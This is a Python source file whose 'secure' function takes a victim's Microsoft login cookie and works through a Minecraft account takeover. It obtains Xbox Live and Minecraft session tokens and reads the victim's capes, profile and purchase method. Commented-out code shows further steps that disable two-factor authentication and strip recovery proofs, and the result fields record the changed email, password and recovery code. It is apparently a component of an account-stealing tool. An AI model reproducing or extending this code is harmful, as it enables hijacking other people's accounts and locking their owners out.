# from views.utils.securityInformation import securityInformation
# from views.utils.getAccountInfo import getAccountInfo
# from views.utils.removeProof import removeProof
from views.utils.getCookies import getCookies
from views.utils.polishHost import polishHost
from views.utils.getProfile import getProfile
# from views.utils.remove2FA import remove2FA
from views.utils.getMethod import getMethod
from views.utils.getCapes import getCapes
# from views.utils.getAMRP import getAMRP
from views.utils.getSSID import getSSID
from views.utils.getXBL import getXBL
from views.utils.getT import getT

def secure(msaauth: str):

    accountInfo = {
        "oldName": "Failed to Get",
        "newName": "Couldn't Change!",
        "oldEmail": "Couldn't Find",
        "email": "Couldn't Change!",
        "secEmail": "Couldn't Change!",
        "password": "Couldn't Change!",
        "recoveryCode": "Couldn't Change!",
        "loginCookie": "Failed to Get",
        "status": "Unknown",
        "timeTaken": 0,
        "SSID": "Failed to Get",
        "firstName": "Failed to Get",
        "lastName": "Failed to Get",
        "fullName": "Failed to Get",
        "region": "Failed to Get",
        "birthday": "Failed to Get",
        "method": "Unknown",
        "capes": []
    }
    
    cookies = getCookies() # [canary, apicanary, amsc]
    print("[+] - Got Cookies! Polishing login cookie...")
    host = polishHost(msaauth, cookies[2])
    if host == "Locked":
        accountInfo["email"] = "Locked"
        accountInfo["secEmail"] = "Locked"
        accountInfo["recoveryCode"] = "Locked"
        accountInfo["password"] = "Locked"
        accountInfo["status"] = "Locked"

        return accountInfo

    if host == "Down":
        accountInfo["email"] = "Microsoft Down"
        accountInfo["secEmail"] = "Microsoft Down"
        accountInfo["recoveryCode"] = "Microsoft Down"
        accountInfo["password"] = "Microsoft Down"
        accountInfo["status"] = "Microsoft Down"

        return accountInfo
    
    print("[~] - Checking Minecraft Account")
    XBLResponse = getXBL(host)

    if XBLResponse:
        print("[+] - Got XBL")
        
        # XBL && Token
        xbl = XBLResponse["xbl"]
        ssid =  getSSID(xbl)
        
        # Get capes, profile and purchase method
        if ssid:
            print("[+] - Got SSID!")
            accountInfo["SSID"] = ssid

            # Might replace with a non ssid request (uuid based)
            capes = getCapes(ssid)
            if capes:
                accountInfo["capes"] = ", ".join(i["alias"] for i in capes)
                print(f"[+] - Got capes")
            else:
                accountInfo["capes"] = "No Capes"

            profile = getProfile(ssid)
            if not profile:
                accountInfo["oldName"] = "No Minecraft"
                print("[x] - Failed to get profile")
            else:
                print(f"[+] - Got profile")
                accountInfo["oldName"] = profile

            method = getMethod(ssid)
            if method:
                accountInfo["method"] = method
                print(f"[+] - Got purchase method")
        else:
            print("[x] - Failed to get SSID")

    else:
        print("[x] - Failed to get XBL")
        accountInfo["oldName"] = "No Minecraft"

    # Not Working (check)
    # Check bellow
    # T = getT()
    # if T == "Locked":
    #     accountInfo["email"] = "Locked"
    #     accountInfo["secEmail"] = "Locked"
    #     accountInfo["recoveryCode"] = "Locked"
    #     accountInfo["password"] = "Locked"
    #     accountInfo["status"] = "Locked"

    #     return accountInfo

    # if T == "Down":
    #     accountInfo["email"] = "Microsoft Down"
    #     accountInfo["secEmail"] = "Microsoft Down"
    #     accountInfo["recoveryCode"] = "Microsoft Down"
    #     accountInfo["password"] = "Microsoft Down"
    #     accountInfo["status"] = "Microsoft Down"

    #     return accountInfo

    # if T:
    #     print("[+] - Found T")
    #     amrp = getAMRP(T, cookies[2])

    #     if amrp:
            
    #         proofsID = "CVaPoMdMAFIqPI8qEUwE8ToVCln9BkJXDVkqlCKu3bd7IUkO4mArxDAa2uUFLSc1WRoWPAHx/UlJieOCBfrVVJ1MZypXSCrKQMD7RVCSqYD15CyzBX/xYyhHLPqqWZqc3P/0ARc9DlbR6C7L5u8ppayQwAc3byXJvMN6T8Er2z3/irB6VR57bZ7U2LgkPZlyF87qaJMfREW37sOjGNtxAup6pByaHaIn50efH9X/6REGB/Qp6o9NAIuLHZcRXsHajkB5Sg6uNpnPQ:=:2:3"

    #         # Two Factor Auth
    #         remove2FA(amrp, cookies[1], cookies[2])
    #         print("[+] - Disabled 2FA")

    #         removeProof(amrp, cookies[1], cookies[2], proofsID)
    #         print("[+] - Removed Proofs")

    #         accountMSInfo = getAccountInfo(amrp, cookies[2])

    #         accountInfo["firstName"] = accountMSInfo["firstName"]
    #         accountInfo["lastName"] = accountMSInfo["lastName"]
    #         accountInfo["fullName"] = accountMSInfo["fullName"]
    #         accountInfo["region"] = accountMSInfo["region"]
    #         accountInfo["birthday"] = accountMSInfo["birthday"]
    #         print("[+] -  Got Account Information")

    #         securityParameters = securityInformation(amrp)
    #         print("[+] - Got Security Parameters")

            

    

    
        

        